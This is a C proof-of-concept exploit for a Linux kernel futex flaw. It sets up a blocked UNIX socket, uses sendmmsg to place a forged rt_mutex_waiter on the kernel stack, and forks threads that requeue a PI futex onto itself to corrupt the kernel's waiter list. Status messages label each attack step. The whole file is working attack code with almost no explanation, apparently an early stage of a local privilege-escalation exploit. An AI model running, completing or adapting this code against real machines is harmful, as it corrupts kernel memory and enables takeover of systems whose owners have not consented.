#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/socket.h>
#include <assert.h>
#include "futex.h"

#define BLOCKBUF "AAAAAAAA"
#define BLOCKBUFLEN strlen(BLOCKBUF)

int child_count = 0;

int client_sockfd, server_sockfd;

struct mmsghdr msgvec;
struct iovec msg[7];

struct rt_mutex_waiter forged_waiter;

int *futexes, *non_pi_futex, *pi_futex;

void setup_msgs()
{
    int i;

    puts("[*] Setting up the messages for the kernel stack.");

    for (i = 0; i < sizeof(msg) / sizeof(msg[0]); i++)
    {
        msg[i].iov_base = &forged_waiter;
        msg[i].iov_len = 1;
    }
    msgvec.msg_hdr.msg_iov = msg;
    msgvec.msg_hdr.msg_iovlen = sizeof(msg) / sizeof(msg[0]);
}

void setup_sockets()
{
    int fds[2];

    puts("[*] Creating the client and server sockets for kernel stack modification.");

    assert(socketpair(AF_UNIX, SOCK_STREAM, 0, fds) == 0);

    client_sockfd = fds[0];
    server_sockfd = fds[1];

    while (send(client_sockfd, BLOCKBUF, BLOCKBUFLEN, MSG_DONTWAIT) != -1)
        ;
    assert(errno == EWOULDBLOCK);
    return;
}

void alloc_futexes()
{
    puts("[*] Allocating the futexes.");

    assert((futexes = mmap(NULL, sizeof(int) * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) > 0);

    non_pi_futex = &futexes[0];
    pi_futex = &futexes[1];
}

void forge_waiter()
{
    puts("[*] Placing the forged waiter on the mutex's waiters list.");

    assert(fwait_requeue(non_pi_futex, pi_futex, 0) == 0);
    assert(sendmmsg(client_sockfd, &msgvec, 1, 0) == 0);

    puts("sendmmsg exited; thread no longer blocks.");
}

void wait_child_processes()
{
    int i;

    for (i = child_count; i > 0; i--)
    {
        printf("[*] Waiting for %u thread(s) left to exit.\n", i);
        wait(NULL);
    }
}

int main()
{
    int pid;

    setup_msgs();
    setup_sockets();
    alloc_futexes();

    flock(pi_futex);

    assert((pid = fork()) != -1);
    if (pid == 0)
    {
        forge_waiter();
        puts("[*] Forger thread exits.");
        exit(EXIT_SUCCESS);
    }
    else
        child_count++;

    sleep(1);
    assert(frequeue(non_pi_futex, pi_futex, 1, 0) == 0);

    assert((pid = fork()) != -1);
    if (pid == 0)
    {
        assert(flock(pi_futex) == 0);
        puts("[*] pi_futex reference holder thread exits.");
        exit(EXIT_SUCCESS);
    }
    else
        child_count++;

    sleep(1);
    *pi_futex = 0;
    frequeue(pi_futex, pi_futex, 1, 0);

    assert((pid = fork()) != -1);
    if (pid == 0)
    {
        assert(flock(pi_futex) == 0);
        puts("[*] List corrupter thread exits.");
        exit(EXIT_SUCCESS);
    }
    else
        child_count++;

    wait_child_processes();

    puts("[*] Main thread exits.");
}
